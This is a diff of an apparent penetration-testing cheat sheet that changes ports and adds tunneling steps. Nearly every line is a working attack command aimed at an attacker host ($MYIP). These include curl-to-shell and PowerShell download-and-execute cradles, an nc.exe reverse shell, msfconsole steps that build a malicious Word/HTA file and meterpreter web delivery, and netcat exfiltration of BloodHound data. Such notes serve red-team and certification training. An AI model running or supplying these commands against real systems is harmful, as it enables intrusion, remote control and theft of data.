@@ -1048,7 +1048,7 @@ telnet --user '$USERNAME' $TARGET
 nmap -p 25 --script="smtp* and not brute" --script-args "smtp-enum-users.methods={VRFY},userdb=/usr/share/nmap/nselib/data/usernames.lst" $TARGET
 
 +---------- Create Malicious File ----------+
-rlwrap msfconsole -q -x 'use exploit/windows/fileformat/office_word_hta; set SRVHOST tun0; set SRVPORT 8080; set LHOST tun0; set LPORT 7788; set FILENAME file.doc; run'
+rlwrap msfconsole -q -x 'use exploit/windows/fileformat/office_word_hta; set SRVHOST tun0; set SRVPORT 8888; set LHOST tun0; set LPORT 7788; set FILENAME file.doc; run'
 
 +---------- Send ----------+
 swaks \
@@ -1430,10 +1430,10 @@ scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 13
 
 ## Ligolo - Port Forward and Pivot
 -->> New Configuration
-sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443
+sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
 curl $MYIP/linux/agent -o agent
 chmod +x agent;
-./agent -ignore-cert -connect $MYIP:443
+./agent -ignore-cert -connect $MYIP:8080
 session
 interface_create --name ligolo
 tunnel_start --tun ligolo
@@ -1501,7 +1501,7 @@ curl -s $MYIP:53/whoami.sh | sh
 curl -s $MYIP:53/linux/linpeas.sh | sh
 
 +---------- Setup Pivot ----------+
-curl $MYIP:53/linux/agent -o /dev/shm/agent;chmod +x /dev/shm/agent;/dev/shm/agent -ignore-cert -connect $MYIP:443
+curl $MYIP/linux/agent -o /dev/shm/agent;chmod +x /dev/shm/agent;/dev/shm/agent -ignore-cert -connect $MYIP:8080
 
 +---------- Creds In DB Files ----------+
 grep -IrinE "db[-_]?(user|pass|login)\w*" / 2>/dev/null
@@ -1700,7 +1700,7 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/re
 \\$MYIP\$\nc.exe $MYIP 80 -e cmd
 
 -->> Web Delivery (PowerShell)
-msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SRVPORT 8080; setg LHOST $MYIP; setg LPORT 443; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
+msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 443; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
 
 -->> Create and Host Malicious .hta (Web Delivery Payload)
 python3 -m http.server 80 /Upload
@@ -1716,6 +1716,7 @@ curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe
 curl $MYIP/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
 curl $MYIP/windows/Rubeus.exe -o \programdata\Rubeus.exe
+curl $MYIP/windows/agent.exe -o \programdata\agent.exe
 curl $MYIP/windows/PowerView.ps1 -o \programdata\PowerView.ps1
 curl $MYIP/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
 curl $MYIP/bat2exe.bat -o \programdata\bat2exe.bat
@@ -1736,14 +1737,15 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/whoami')
 //$MYIP/$/winPEASofs.exe > //$MYIP/$/output_winPEAS.txt
 tail -f /Upload/windows/output_winPEAS.txt
 
++---------- Setup Pivot ----------+
+curl $MYIP/windows/agent.exe -o \programdata\agent.exe
+\programdata\agent.exe -ignore-cert -connect $MYIP:8080
+
 +---------- Sharphound Data ----------+
 curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe; \programdata\Sharphound.exe
 curl $MYIP/windows/nc.exe -o \programdata\nc.exe
 \programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
-
-+---------- Ligolo ----------+
-curl $MYIP/windows/agent.exe -o \programdata\agent.exe
 
 +---------- Ping Sweep /24 ----------+
 //$MYIP/$/ping.bat 192.168.210.X
@@ -1893,7 +1895,7 @@ services.msc
 rlwrap msfconsole -q -x "use multi/handler; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; setg LHOST $MYIP; setg LPORT 4444; run"
 
 -->> Web Delivery
-msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; setg SRVPORT 8080; setg LHOST $MYIP; setg LPORT 80; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
+msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 80; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
 
 +---------- Stored Credentials ----------+
 run post/windows/gather/credentials/windows_autologin
